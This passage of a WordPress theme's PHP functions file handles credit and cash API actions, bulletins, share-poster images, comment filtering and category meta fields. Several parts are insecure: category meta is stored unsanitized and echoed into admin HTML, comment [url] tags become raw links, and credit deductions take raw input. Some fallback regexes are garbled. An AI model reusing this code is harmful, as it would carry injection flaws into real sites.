        case 'daily_sign':
            $result = tt_daily_sign();
            if ($result instanceof WP_Error) {
                return $result;
            }
            if ($result) {
                return tt_api_success(sprintf(__('Daily sign successfully and gain %d credits', 'tt'), (int) tt_get_option('tt_daily_sign_credits', 10)));
            }
            break;
        case 'credits_charge':
            $min_credit_price = tt_get_option('tt_hundred_min_credit_price',5);
            $hundred_credits_price = intval(tt_get_option('tt_hundred_credit_price', 1));
            if (($hundred_credits_price * $_POST['amount']) < $min_credit_price) {
                return tt_api_fail('最低' . $min_credit_price . '元起充');
            }
            $charge_order = tt_create_credit_charge_order(get_current_user_id(), $_POST['amount']);
            if (!$charge_order) {
                return tt_api_fail(__('Create credits charge order failed', 'tt'));
            } elseif (is_array($charge_order) && isset($charge_order['order_id'])) {
                $checkout_nonce = wp_create_nonce('checkout');
                $checkout_url = add_query_arg(array('oid' => $charge_order['order_id'], 'spm' => $checkout_nonce), tt_url_for('checkout'));
                $charge_order['url'] = $checkout_url;

                return tt_api_success(__('Create order successfully', 'tt'), array('data' => $charge_order));
            }
            break;
        case 'add_credits':
            $user_id = absint($_POST['uid']);
            $amount = absint($_POST['num']);
            $result = tt_update_user_credit($user_id, $amount, '', true);
            if ($result) {
                return tt_api_success(__('Update user credits successfully', 'tt'));
            }

            return tt_api_fail(__('Update user credits failed', 'tt'));
        case 'take_credits':
            $user_id = absint($_POST['uid']);
            $amount = '-' . $_POST['num'];
            $result = tt_update_user_credit($user_id, $amount, '', true);
            if ($result) {
                return tt_api_success(__('Update user credits successfully', 'tt'));
            }

            return tt_api_fail(__('Update user credits failed', 'tt'));
        case 'add_cash':
            $user_id = absint($_POST['uid']);
            $amount = absint($_POST['num']);
            $result = tt_update_user_cash($user_id, $amount, '', true);
            if ($result) {
                return tt_api_success(__('Update user cash successfully', 'tt'));
            }

            return tt_api_fail(__('Update user cash failed', 'tt'));
        case 'take_cash':
            $user_id = absint($_POST['uid']);
            $amount = '-' . $_POST['num'];
            $result = tt_update_user_cash($user_id, $amount, '', true);
            if ($result) {
                return tt_api_success(__('Update user cash successfully', 'tt'));
            }

            return tt_api_fail(__('Update user cash failed', 'tt'));
        case 'apply_card':
            $card_id = htmlspecialchars($_POST['card_id']);
            $card_secret = htmlspecialchars($_POST['card_secret']);
            $result = tt_add_cash_by_card($card_id, $card_secret);
            if ($result instanceof WP_Error) {
                return $result;
            } elseif ($result) {
                return tt_api_success(sprintf(__('Apply card to charge successfully, balance add %0.2f', 'tt'), $result / 100));
            }

            return tt_api_fail(__('Apply card to charge failed', 'tt'));
    }

    return null;
}

function tt_create_bulletin_post_type()
{
    $bulletin_slug = tt_get_option('tt_bulletin_archives_slug', 'bulletin');
    register_post_type('bulletin',
        array(
            'labels' => array(
                'name' => _x('Bulletins', 'taxonomy general name', 'tt'),
                'singular_name' => _x('Bulletin', 'taxonomy singular name', 'tt'),
                'add_new' => __('Add New Bulletin', 'tt'),
                'add_new_item' => __('Add New Bulletin', 'tt'),
                'edit' => __('Edit', 'tt'),
                'edit_item' => __('Edit Bulletin', 'tt'),
                'new_item' => __('Add Bulletin', 'tt'),
                'view' => __('View', 'tt'),
                'all_items' => __('All Bulletins', 'tt'),
                'view_item' => __('View Bulletin', 'tt'),
                'search_items' => __('Search Bulletin', 'tt'),
                'not_found' => __('Bulletin not found', 'tt'),
                'not_found_in_trash' => __('Bulletin not found in trash', 'tt'),
                'parent' => __('Parent Bulletin', 'tt'),
                'menu_name' => __('Bulletins', 'tt'),
            ),

            'public' => true,
            'menu_position' => 16,
            'supports' => array('title', 'author', 'editor', /* 'comments', */'excerpt'),
            'taxonomies' => array(''),
            'menu_icon' => 'dashicons-megaphone',
            'has_archive' => false,
            'rewrite' => array('slug' => $bulletin_slug),
        )
    );
}
add_action('init', 'tt_create_bulletin_post_type');

function tt_include_bulletin_template_function($template_path)
{
    if (get_post_type() == 'bulletin') {
        if (is_single()) {
            //指定单个公告模板
            if ($theme_file = locate_template(array('core/templates/bulletins/tpl.Bulletin.php'))) {
                $template_path = $theme_file;
            }
        }
    }

    return $template_path;
}
add_filter('template_include', 'tt_include_bulletin_template_function', 1);

function tt_custom_bulletin_link($link, $post = null)
{
    $bulletin_slug = tt_get_option('tt_bulletin_archives_slug', 'bulletin');
    $bulletin_slug_mode = tt_get_option('tt_bulletin_link_mode') == 'post_name' ? $post->post_name : $post->ID;
    if ($post->post_type == 'bulletin') {
        return home_url($bulletin_slug.'/'.$bulletin_slug_mode.'.html');
    } else {
        return $link;
    }
}
add_filter('post_type_link', 'tt_custom_bulletin_link', 1, 2);

function tt_handle_custom_bulletin_rewrite_rules()
{
    $bulletin_slug = tt_get_option('tt_bulletin_archives_slug', 'bulletin');
    if (tt_get_option('tt_bulletin_link_mode') == 'post_name'):
        add_rewrite_rule(
            $bulletin_slug.'/([一-龥a-zA-Z0-9_-]+)?.html([\s\S]*)?$',
            'index.php?post_type=bulletin&name=$matches[1]',
            'top'); else:
        add_rewrite_rule(
            $bulletin_slug.'/([0-9]+)?.html([\s\S]*)?$',
            'index.php?post_type=bulletin&p=$matches[1]',
            'top');
    endif;
}
add_action('init', 'tt_handle_custom_bulletin_rewrite_rules');

function tt_allow_contributor_uploads()
{
    $contributor = get_role('contributor');
    $contributor->add_cap('upload_files');
}

if (current_user_can('contributor') && !current_user_can('upload_files')) {
    add_action('init', 'tt_allow_contributor_uploads');
}

function tt_remove_post_id_for_front_contribute($settings)
{
    if (get_query_var('me_child_route') === 'newpost') {
        $settings['post'] = array();
    }

    return $settings;
}

if (!is_admin()) {
    add_filter('media_view_settings', 'tt_remove_post_id_for_front_contribute', 10, 1);
}

////// services //////

/**
 * 积分小工具服务-数据.
 */
function tt_exec_common_service_common_widget_credit_data($params)
{
    $credits = intval(tt_get_user_credit());

    // $rules = array();
    $has_signed = false;
    if (get_user_meta($params['uid'], 'tt_daily_sign', true)) {
        date_default_timezone_set('Asia/Shanghai');
        $sign_date_meta = get_user_meta($params['uid'], 'tt_daily_sign', true);
        $sign_date = date('Y-m-d', strtotime($sign_date_meta));
        $now_date = date('Y-m-d', time());
        if ($sign_date == $now_date) {
            $has_signed = true;
        }
    }
    // $price = intval(tt_get_option('tt_hundred_credit_price', 1));
    $data = array(
        'credits' => $credits,
        'signed' => $has_signed,
        // 'price' => $price
    );

    return tt_create_common_response($data);
}

/**
 * 积分小工具服务-签到.
 */
function tt_exec_common_service_common_widget_credit_sign($params)
{
    $result = tt_daily_sign();
    if ($result instanceof WP_Error) {
        return tt_create_common_error($result->get_error_message(), $result->get_error_code());
    }
    return tt_create_common_response(array(
        'credits' => intval(tt_get_user_credit())
    ));
}

if (TT_PRO && tt_get_option('tt_enable_shop', false)) {
    load_func('func.Shop.Loader');
}

load_class('class.Avatar');
load_class('class.Open');
load_class('class.PostImage');
load_class('class.Utils');
load_class('class.Member');
load_class('class.Async.Task');
load_class('class.Async.Email');
load_class('class.Enum');
load_class('class.WeiBoUploader');
load_class('class.WeiBoException');
load_class('class.Categories.Images');
load_class('plates/Engine');
load_class('plates/Extension/ExtensionInterface');
load_class('plates/Template/Data');
load_class('plates/Template/Directory');
load_class('plates/Template/FileExtension');
load_class('plates/Template/Folder');
load_class('plates/Template/Folders');
load_class('plates/Template/Func');
load_class('plates/Template/Functions');
load_class('plates/Template/Name');
load_class('plates/Template/Template');
load_class('plates/Extension/Asset');
load_class('plates/Extension/URI');

if (is_admin()) {
    load_class('class.Tgm.Plugin.Activation');
}
if (TT_PRO && tt_get_option('tt_enable_shop', false)) {
    load_class('shop/class.Product');
    load_class('shop/class.OrderStatus');
    load_func('shop/alipay/alipay_notify.class');
    load_func('shop/alipay/aliqrpay.class');
    load_func('shop/alipay/alipay.class');
}

load_vm('vm.Base');
load_vm('vm.Home.Slides');
load_vm('vm.Home.Popular');
load_vm('vm.Stickys');
load_vm('vm.Home.CMSCats');
load_vm('vm.Home.Latest');
load_vm('vm.Home.FeaturedCategory');
load_vm('vm.Single.Post');
load_vm('vm.Single.Page');
load_vm('vm.Post.Comments');
load_vm('vm.Category.Posts');
load_vm('vm.Tag.Posts');
load_vm('vm.Date.Archive');
load_vm('vm.Term.Posts');
load_vm('vm.Embed.Post');
load_vm('vm.Weibo.Image');
load_vm('widgets/vm.Widget.Author');
load_vm('widgets/vm.Widget.HotHit.Posts');
load_vm('widgets/vm.Widget.HotReviewed.Posts');
load_vm('widgets/vm.Widget.Recent.Comments');
load_vm('widgets/vm.Widget.Latest.Posts');
load_vm('widgets/vm.Widget.CreditsRank');
load_vm('widgets/vm.Widget.HotProduct');
load_vm('widgets/vm.Widget.UC');
load_vm('uc/vm.UC.Latest');
load_vm('uc/vm.UC.Stars');
load_vm('uc/vm.UC.Comments');
load_vm('uc/vm.UC.Followers');
load_vm('uc/vm.UC.Following');
load_vm('uc/vm.UC.Chat');
load_vm('uc/vm.UC.Profile');
load_vm('me/vm.Me.Settings');
load_vm('me/vm.Me.Credits');
load_vm('me/vm.Me.Drafts');
load_vm('me/vm.Me.Messages');
load_vm('me/vm.Me.Notifications');
load_vm('me/vm.Me.EditPost');
load_vm('vm.Search');
if (TT_PRO && tt_get_option('tt_enable_shop', false)) {
    load_vm('shop/vm.Shop.Header.SubNav');
    load_vm('shop/vm.Shop.Home');
    load_vm('shop/vm.Shop.Category');
    load_vm('shop/vm.Shop.Tag');
    load_vm('shop/vm.Shop.Search');
    load_vm('shop/vm.Shop.Product');
    load_vm('shop/vm.Shop.Comment');
    load_vm('shop/vm.Shop.LatestRated');
    load_vm('shop/vm.Shop.ViewHistory');
    load_vm('shop/vm.Embed.Product');
}
load_vm('bulletin/vm.Bulletin');
load_vm('bulletin/vm.Bulletins');
if (TT_PRO) {
    load_vm('me/vm.Me.Order');
    load_vm('me/vm.Me.Orders');
    load_vm('me/vm.Me.Membership');
    load_vm('me/vm.Me.Cash');
    load_vm('management/vm.Mg.Status');
    load_vm('management/vm.Mg.Comments');
    load_vm('management/vm.Mg.Coupons');
    load_vm('management/vm.Mg.Invites');
    load_vm('management/vm.Mg.Members');
    load_vm('management/vm.Mg.Orders');
    load_vm('management/vm.Mg.Order');
    load_vm('management/vm.Mg.Posts');
    load_vm('management/vm.Mg.Users');
    load_vm('management/vm.Mg.User');
    load_vm('management/vm.Mg.Products');
    load_vm('management/vm.Mg.Cards');
}

load_widget('wgt.TagCloud');
load_widget('wgt.Author');
load_widget('wgt.HotHits.Posts');
load_widget('wgt.HotReviews.Posts');
load_widget('wgt.RecentComments');
load_widget('wgt.Latest.Posts');
load_widget('wgt.UC');
load_widget('wgt.EnhancedText');
load_widget('wgt.Donate');
load_widget('wgt.AwardCoupon');
load_widget('wgt.CreditsRank');
load_widget('wgt.Search');
load_widget('wgt.HotProduct');
load_widget('wgt.Statistic');
load_widget('wgt.CreditIntro');
load_widget('wgt.Down');

new AsyncEmail();
if(strpos($_SERVER['REQUEST_URI'] ,'api')===false && !tt_get_option('tt_enable_k_fancybox', false)){ 
add_filter('the_content', 'fancybox1');
add_filter('the_content', 'fancybox2');
}
function fancybox1($content){ 
    global $post;
    $pattern = "/<a(.*?)href=('|\")([^>]*)('|\")(.*?)><img(.*?)<\/a>/i";
    $replacement = '<a$1href=$2$3$4$5><duang$6</a>';
    $content = preg_replace($pattern, $replacement, $content);
    $pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png|swf)('|\")(.*?)><img(.*?)<\/a>/i";
    $replacement = '<img$7';
    $content = preg_replace($pattern, $replacement, $content);
    $pattern = '/<img([^>]*)class="([^"]*)"([^>]*)>/i';
    $replacement = '<img$1$3>';
    $content = preg_replace($pattern, $replacement, $content);
    $pattern = "/<img(.*?)src=('|\")([^>]*).(bmp|gif|jpeg|jpg|png|swf)('|\")(.*?)>/i";
    $replacement = '<a$1href=$2$3.$4$5 data-fancybox="images"><img$1 class="lazy" src='.LAZY_PENDING_IMAGE .' data-original=$2$3.$4$5$6></a>';
    $content = preg_replace($pattern, $replacement, $content);
    $pattern = "/<a(.*?)href=('|\")([^>]*)('|\")(.*?)><duang(.*?)<\/a>/i";
    $replacement = '<a$1href=$2$3$4$5><img$6</a>';
    $content = preg_replace($pattern, $replacement, $content);
    return $content;
}
function fancybox2($content){ 
    global $post;
    $pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png|swf)('|\")(.*?)>([^<img]*)<\/a>/i";
    $replacement = '<a$1href=$2$3.$4$5 data-fancybox="images"$6>$7</a>';
    $content = preg_replace($pattern, $replacement, $content);
    return $content;
}
add_filter('manage_posts_columns', 'customer_post_id_columns');
function customer_post_id_columns($columns) {
        $columns['post_id'] = '文章ID';
        return $columns;
}
add_action('manage_posts_custom_column', 'customer_post_id_columns_value', 10, 2);
function customer_post_id_columns_value($column, $post_id) {
        if ($column == 'post_id') {
             echo $post_id;
        }
        return;
}

function get_mypost_thumbnail($post_ID){
    $post = get_post($post_ID);
    if (has_post_thumbnail($post)) {
            $timthumb_src = wp_get_attachment_image_src( get_post_thumbnail_id($post_ID), 'full' ); 
            $url = $timthumb_src[0];
    } else {
        if(!$post_content){
            $post = get_post($post_ID);
            $post_content = $post->post_content;
        }
        preg_match_all('|<img.*?src=[\'"](.*?)[\'"].*?>|i', do_shortcode($post_content), $matches);
        if( $matches && isset($matches[1]) && isset($matches[1][0]) ){       
            $url =  $matches[1][0];
        }else{
            $url = THEME_ASSET . '/img/thumb/' . mt_rand(1, absint(40)) . '.jpg';
        }
    }
    return $url;
}
add_action('wp_ajax_nopriv_create-bigger-image', 'get_bigger_img');
add_action('wp_ajax_create-bigger-image', 'get_bigger_img');
function draw_txt_to($card, $pos, $str, $iswrite, $font_file)
{
    $_str_h = $pos['top'];
    $fontsize = $pos['fontsize'];
    $width = $pos['width'];
    $margin_lift = $pos['left'];
    $hang_size = $pos['hang_size'];
    $temp_string = '';
    $tp = 0;
    $font_color = imagecolorallocate($card, $pos['color'][0], $pos['color'][1], $pos['color'][2]);
    $i = 0;
    while ($i < mb_strlen($str)) {
        $box = imagettfbbox($fontsize, 0, $font_file, mi_str_encode($temp_string));
        $_string_length = $box[2] - $box[0];
        $temptext = mb_substr($str, $i, 1);
        $temp = imagettfbbox($fontsize, 0, $font_file, mi_str_encode($temptext));
        if ($_string_length + $temp[2] - $temp[0] < $width) {
            $temp_string .= mb_substr($str, $i, 1);
            if ($i == mb_strlen($str) - 1) {
                $_str_h = $_str_h + $hang_size;
                $_str_h += $hang_size;
                $tp = $tp + 1;
                if ($iswrite) {
                    imagettftext($card, $fontsize, 0, $margin_lift, $_str_h, $font_color, $font_file, mi_str_encode($temp_string));
                }
            }
        } else {
            $texts = mb_substr($str, $i, 1);
            $isfuhao = preg_match('/[\\pP]/u', $texts) ? true : false;
            if ($isfuhao) {
                $temp_string .= $texts;
                $f = mb_substr($str, $i + 1, 1);
                $fh = preg_match('/[\\pP]/u', $f) ? true : false;
                if ($fh) {
                    $temp_string .= $f;
                    $i = $i + 1;
                }
            } else {
                $i = $i + -1;
            }
            $tmp_str_len = mb_strlen($temp_string);
            $s = mb_substr($temp_string, $tmp_str_len - 1, 1);
            if (is_firstfuhao($s)) {
                $temp_string = rtrim($temp_string, $s);
                $i = $i + -1;
            }
            $_str_h = $_str_h + $hang_size;
            $_str_h += $hang_size;
            $tp = $tp + 1;
            if ($iswrite) {
                imagettftext($card, $fontsize, 0, $margin_lift, $_str_h, $font_color, $font_file, mi_str_encode($temp_string));
            }
            $temp_string = '';
        }
        $i = $i + 1;
    }
    return $tp * $hang_size;
}
function is_firstfuhao($str)
{
    $fuhaos = array('0' => '"', '1' => '“', '2' => '\'', '3' => '<', '4' => '《');
    return in_array($str, $fuhaos);
}
function mi_str_encode($string)
{
    return $string;
	$len = strlen($string);
    $buf = '';
    $i = 0;
    while ($i < $len) {
        if (ord($string[$i]) <= 127) {
            $buf .= $string[$i];
        } elseif (ord($string[$i]) < 192) {
            $buf .= '&#xfffd;';
        } elseif (ord($string[$i]) < 224) {
            $buf .= sprintf('&#%d;', ord($string[$i + 0]) + ord($string[$i + 1]));
            $i = $i + 1;
            $i += 1;
        } elseif (ord($string[$i]) < 240) {
            ord($string[$i + 2]);
            $buf .= sprintf('&#%d;', ord($string[$i + 0]) + ord($string[$i + 1]) + ord($string[$i + 2]));
            $i = $i + 2;
            $i += 2;
        } else {
            ord($string[$i + 2]);
            ord($string[$i + 3]);
            $buf .= sprintf('&#%d;', ord($string[$i + 0]) + ord($string[$i + 1]) + ord($string[$i + 2]) + ord($string[$i + 3]));
            $i = $i + 3;
            $i += 3;
        }
        $i = $i + 1;
    }
    return $buf;
}
function substr_ext($str, $start = 0, $length, $charset = 'utf-8', $suffix = '')
{
    if (function_exists('mb_substr')) {
        return mb_substr($str, $start, $length, $charset) . $suffix;
    }
    if (function_exists('iconv_substr')) {
        return iconv_substr($str, $start, $length, $charset) . $suffix;
    }
    $re['utf-8'] = '/[-]|[?-?][?-?]|[?-?][?-?]{2}|[?-?][?-?]{3}/';
    $re['gb2312'] = '/[-]|[?-?][?-?]/';
    $re['gbk'] = '/[-]|[?-?][@-?]/';
    $re['big5'] = '/[-]|[?-?]([@-~]|?-?])/';
    preg_match_all($re[$charset], $str, $match);
    $slice = join('', array_slice($match[0], $start, $length));
    return $slice . $suffix;
}
function create_bigger_image($post_id, $date, $title, $content, $head_img, $qrcode_img = null)
{
    $im = imagecreatetruecolor(750, 1334);
    $white = imagecolorallocate($im, 255, 255, 255);
    $gray = imagecolorallocate($im, 200, 200, 200);
    $foot_text_color = imagecolorallocate($im, 153, 153, 153);
    $black = imagecolorallocate($im, 0, 0, 0);
    $title_text_color = imagecolorallocate($im, 51, 51, 51);
    $english_font = get_template_directory() . '/assets/fonts/Montserrat-Regular.ttf';
    $chinese_font = get_template_directory() . '/assets/fonts/MFShangYa_Regular.otf';
    $chinese_font_2 = get_template_directory() . '/assets/fonts/hanyixizhongyuan.ttf';
    imagefill($im, 0, 0, $white);
    $head_img = imagecreatefromstring(file_get_contents(THEME_URI . '/core/library/timthumb/Timthumb.php?src='.$head_img.'&h=680&w=750&zc=1&a=c&q=100&s=1'));
    imagecopy($im, $head_img, 0, 0, 0, 0, 750, 680);
    $day = $date['day'];
    $day_width = imagettfbbox(85, 0, $english_font, $day);
    $day_width = abs($day_width[2] - $day_width[0]);
    $year = $date['year'];
    $year_width = imagettfbbox(24, 0, $english_font, $year);
    $year_width = abs($year_width[2] - $year_width[0]);
    $day_left = ($year_width - $day_width) / 2;
    $fenge = '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ';
    $fenge_width = 750;
    $bg_img = THEME_URI . '/assets/img/icon/bg.png';
    $bg_str = file_get_contents($bg_img);
    $bg_size = getimagesizefromstring($bg_str);
    $bg_img = imagecreatefromstring($bg_str);
    imagecopyresized($im, $bg_img, 40, 490, 0, 0, 150, 150, $bg_size[0], $bg_size[1]);
    imagettftext($im, 80, 0, 50 + $day_left, 575, $white, $english_font, $day);
    imageline($im, 50, 590, 50 + $year_width, 590, $white);
    imagettftext($im, 24, 0, 50, 625, $white, $english_font, $year);
    imagettftext($im, 10, 0, 0, 1160, $foot_text_color, $chinese_font_2, $fenge);
    $title = mi_str_encode($title);
    $title_width = imagettfbbox(28, 0, $chinese_font, $title);
    $title_width = abs($title_width[2] - $title_width[0]);
    $title_left = (750 - $title_width) / 2;
    //imagettftext($im, 28, 0, $title_left, 830, $black, $chinese_font, $title);
    $conf_t = array('color' => array('0' => 0, '1' => 0, '2' => 0), 'fontsize' => 28, 'width' => 650, 'left' => 50, 'top' => 700, 'hang_size' => 30);
    draw_txt_to($im, $conf_t, $title, true, $chinese_font);
    $conf = array('color' => array('0' => 99, '1' => 99, '2' => 99), 'fontsize' => 21, 'width' => 610, 'left' => 70, 'top' => 870, 'hang_size' => 20);
    draw_txt_to($im, $conf, $content, true, $chinese_font_2);
    $style = array();
    imagesetstyle($im, $style);
    imageline($im, 0, 1136, 750, 1136, IMG_COLOR_STYLED);
    $foot_text = tt_get_option('tt_postfm_description');
    $foot_text = $foot_text ? $foot_text : get_bloginfo('description');
    $foot_text = mi_str_encode($foot_text);
    $logo_img = tt_get_option('tt_postfm_logo');
    $logo_img = imagecreatefromstring(file_get_contents(THEME_URI . '/core/library/timthumb/Timthumb.php?src='.$logo_img.'&h=40&w=181&zc=1&a=c&q=100&s=1'));
    if ($qrcode_img) {
        imagecopy($im, $logo_img, 50, 1200, 0, 0, 181, 40);
        imagettftext($im, 14, 0, 25, 1275, $foot_text_color, $chinese_font_2, $foot_text);
        $qrcode_str = file_get_contents($qrcode_img);
        $qrcode_size = getimagesizefromstring($qrcode_str);
        $qrcode_img = imagecreatefromstring($qrcode_str);
        imagecopyresized($im, $qrcode_img, 600, 1185, 0, 0, 100, 100, $qrcode_size[0], $qrcode_size[1]);
    } else {
        imagecopy($im, $logo_img, 284, 1200, 0, 0, 181, 40);
        $foot_text_width = imagettfbbox(14, 0, $chinese_font, $foot_text);
        $foot_text_width = abs($foot_text_width[2] - $foot_text_width[0]);
        $foot_text_left = 750 - $foot_text_width / 2;
        imagettftext($im, 14, 0, $foot_text_left, 1275, $foot_text_color, $chinese_font_2, $foot_text);
    }
    $upload_dir = wp_upload_dir();
    $filename = '/bigger-'.$post_id .'-' . uniqid() . '.png';
    $file = $upload_dir['basedir'] .'/tmp'. $filename;
    imagepng($im, $file);
    require_once ABSPATH . 'wp-admin/includes/image.php';
    require_once ABSPATH . 'wp-admin/includes/file.php';
    require_once ABSPATH . 'wp-admin/includes/media.php';
    $src = media_sideload_image($upload_dir['baseurl'] .'/tmp'. $filename, $post_id, NULL, 'src');
    unlink($file);
    error_reporting(0);
    imagedestroy($im);
    if (is_wp_error($src)) {
        return false;
    }
    return $src;
}

function get_bigger_img()
{
    $post_id = sanitize_text_field($_POST['id']);
    if (wp_verify_nonce($_POST['nonce'], 'mi-create-bigger-image-' . $post_id)) {
        get_the_time('d', $post_id);
        get_the_time('Y/m', $post_id);
        $date = array('day' => get_the_time('d', $post_id), 'year' => get_the_time('Y/m', $post_id));
        $title = get_the_title($post_id);
        $share_title = get_the_title($post_id);
        $title = substr_ext($title, 0, 35, 'utf-8', '');
        $post = get_post($post_id);
        $content = $post->post_excerpt ? $post->post_excerpt : $post->post_content;
        $content = preg_replace('#<script[^>]*?>.*?</script>#si','',$content); 
        $content = preg_replace('#<style[^>]*?>.*?</style>#si','',$content);
        $content = preg_replace('#<pre[^>]*?>.*?</pre>#si','',$content); 
        $content = substr_ext(strip_tags(strip_shortcodes($content)), 0, 100, 'utf-8', '...');
        $share_content = '【' . $share_title . '】' . substr_ext(strip_tags(strip_shortcodes($content)), 0, 80, 'utf-8', '');
        $content = str_replace(PHP_EOL, '', strip_tags(apply_filters('the_content', $content)));
        $head_img = get_mypost_thumbnail($post_id);
        $qrcode_img = home_url('/').'site/qr?key=bigger&text=' . get_the_permalink($post_id);
        
        
        if (get_post_meta($post_id, 'bigger_cover', true)) {
           $result = get_post_meta($post_id, 'bigger_cover', true);
          } else {
          $result = create_bigger_image($post_id, $date, $title, $content, $head_img, $qrcode_img);
          }
        if ($result) {
            $weibo_pic = weibo_attachment_replace($result);
            $pic = '&pic=' . urlencode($weibo_pic);
            if (!get_post_meta($post_id, 'bigger_cover', true)) {
               add_post_meta($post_id, 'bigger_cover', $result);
            }
            $share_link = sprintf('https://service.weibo.com/share/share.php?url=%s&type=button&language=zh_cn&searchPic=true%s&title=%s', urlencode(get_the_permalink($post_id)), $pic, $share_content);
            $msg = array('s' => 200, 'src' => $weibo_pic, 'share' => $share_link);
        } else {
            $msg = array('s' => 404, 'm' => 'bigger 封面生成失败，请稍后再试！');
        }
    } else {
        $msg = array('s' => 404, 'm' => '嘿嘿嘿！');
    }
    echo json_encode($msg);
    exit(0);
}
function sig_allowed_html_tags_in_comments() {
    define('CUSTOM_TAGS', true);
    global $allowedtags;
    $allowedtags = array(
        'img' => array(
			'class' => true,
			'alt' => true,
			'align' => true,
			'border' => true,
			'height' => true,
			'hspace' => true,
			'longdesc' => true,
			'vspace' => true,
			'src' => true,
			'usemap' => true,
			'width' => true,
		),
        'a' => array(
			'href' => true,
			'rel' => true,
			'rev' => true,
			'name' => true,
			'target' => true,
		),
		'font' => array(
			'color' => true,
			'face' => true,
			'size' => true,
		),
        'strong' => array(),
		'em' => array(),
		'blockquote' => array(
			'cite' => true,
			'lang' => true,
			'xml:lang' => true,
		),
		'del' => array(
			'datetime' => true,
		),
		'u' => array(),
		'pre' => array(
			'class' => true,
			'width' => true,
		),
		'code' => array()
    );
}
add_action('init', 'sig_allowed_html_tags_in_comments', 10);
function comments_url($comment_data) {
    
    $comment_data['comment_content'] = preg_replace('/\[url\=(.*?)\](.*?)\[\/url\]/', '<a href="$1" target="_blank" rel="nofollow">$2</a>', $comment_data['comment_content']);
    return ($comment_data);
}
add_filter('preprocess_comment', 'comments_url');



add_action( 'category_add_form_fields', 'add_tax_custom_field');  

add_action( 'category_edit_form_fields', 'edit_tax_custom_field');  
  

add_action( 'edited_category', 'save_tax_meta', 10, 2 );  
add_action( 'create_category', 'save_tax_meta', 10, 2 );  
function add_tax_custom_field(){  
    ?>  
        <div class="form-field">  
            <label for="term_meta[tax_title]">分类标题</label>  
            <input type="text" name="term_meta[tax_title]" id="term_meta[tax_title]" value="" />  
            <p class="description">输入分类标题</p>  
        </div>
          
        
        <div class="form-field">  
            <label for="term_meta[tax_keywords]">分类关键字</label>  
            <input type="text" name="term_meta[tax_keywords]" id="term_meta[tax_keywords]" value="" />  
            <p class="description">输入分类关键字</p>  
        </div>
  
        <div class="form-field">  
            <label for="term_meta[tax_description]">分类描述</label>  
            <input type="text" name="term_meta[tax_description]" id="term_meta[tax_description]" value="" />  
            <p class="description">输入分类描述</p>  
        </div>
  
    <?php  
    } // add_tax_image_field  
   
function edit_tax_custom_field( $term ){  
          
        // $term_id 是当前分类的id  
        $term_id = $term->term_id;  
          
        // 获取已保存的option  
        $term_meta = get_option( "bbcat_taxonomy_$term_id" );  
        // option是一个二维数组  
        $title = $term_meta['tax_title'] ? $term_meta['tax_title'] : '';  
        
        $keywords = $term_meta['tax_keywords'] ? $term_meta['tax_keywords'] : ''; 
  
        $description = $term_meta['tax_description'] ? $term_meta['tax_description'] : '';
         
    ?>  
        <tr class="form-field">  
            <th scope="row">  
                <label for="term_meta[tax_title]">分类标题</label>  
                <td>  
                    <input type="text" name="term_meta[tax_title]" id="term_meta[tax_title]" value="<?php echo $title; ?>" />  
                    <p class="description">输入分类标题</p>  
                </td>  
            </th>
        </tr>
          
        
        <tr class="form-field">  
            <th scope="row">  
                <label for="term_meta[tax_keywords]">分类关键字</label>  
                <td>  
                    <input type="text" name="term_meta[tax_keywords]" id="term_meta[tax_keywords]" value="<?php echo $keywords; ?>" />  
                    <p class="description">输入分类关键字</p>  
                </td>  
            </th>  
        </tr>

        <tr class="form-field">  
            <th scope="row">  
                <label for="term_meta[tax_description]">分类描述</label>  
                <td>  
                    <input type="text" name="term_meta[tax_description]" id="term_meta[tax_description]" value="<?php echo $description; ?>" />  
                    <p class="description">输入分类描述</p>  
                </td>  
            </th>  
        </tr>
          
    <?php  
    } // edit_tax_image_field  
   
function save_tax_meta( $term_id ){  
   
        if ( isset( $_POST['term_meta'] ) ) {  
              
            // $term_id 是当前分类的id  
            $t_id = $term_id;  
            $term_meta = array();  
              
            // 获取表单传过来的POST数据，POST数组一定要做过滤  
            $term_meta['tax_title'] = isset ( $_POST['term_meta']['tax_title'] ) ? $_POST['term_meta']['tax_title'] : '';
            $term_meta['tax_keywords'] = isset ( $_POST['term_meta']['tax_keywords'] ) ? $_POST['term_meta']['tax_keywords'] : ''; 
            $term_meta['tax_description'] = isset ( $_POST['term_meta']['tax_description'] ) ? $_POST['term_meta']['tax_description'] : '';
            
  
            // 保存option数组  
            update_option( "bbcat_taxonomy_$t_id", $term_meta );  
   
        } // if isset( $_POST['term_meta'] )  
    } // save_tax_meta  
function tt_blacklist_check($author, $email, $url, $comment, $user_ip, $user_agent) {
	$mod_keys = trim( tt_get_option('tt_comment_blacklist_check') );
	if ( '' == $mod_keys )
		return false; // If moderation keys are empty

	// Ensure HTML tags are not being used to bypass the blacklist.
	$comment_without_html = wp_strip_all_tags( $comment );

	$words = explode(",", $mod_keys );

	foreach ( (array) $words as $word ) {
		$word = trim($word);

		// Skip empty lines
		if ( empty($word) ) { continue; }

		// Do some escaping magic so that '#' chars in the
		// spam words don't break things:
		$word = preg_quote($word, '#');

		$pattern = "#$word#i";
		if (
			   preg_match($pattern, $author)
			|| preg_match($pattern, $email)
			|| preg_match($pattern, $url)
			|| preg_match($pattern, $comment)
			|| preg_match($pattern, $comment_without_html)
			|| preg_match($pattern, $user_ip)
			|| preg_match($pattern, $user_agent)
		 )
			return true;
	}
	return false;
}
function tt_comment_blacklist_check($comment) {
    if (!current_user_can('edit_users') && tt_blacklist_check($comment['comment_author'], $comment['comment_author_email'], $comment['comment_author_url'], $comment['comment_content'], $comment['comment_author_IP'], $comment['comment_agent'])) {
        wp_die(__('评论中含有禁止内容！', 'tt'), __('温馨提示', 'tt'), 403);
      }elseif(!is_user_logged_in() && (get_user_by('login', $comment['comment_author_email']) || get_user_by('email', $comment['comment_author_email']))) {
        wp_die(__('该邮箱已注册，禁止冒充！如你是帐号持有者请登录后再提交评论！', 'tt'), __('温馨提示', 'tt'), 403);
      }else{
        return $comment;
    }
}
add_filter('preprocess_comment', 'tt_comment_blacklist_check');

global $wb_uploader, $processed;
$wb_uploader = \Kuacg\WeiBoUploader::newInstance(tt_get_option('tt_k_weibo_image_username'), tt_get_option('tt_k_weibo_image_password'));
$processed = array();

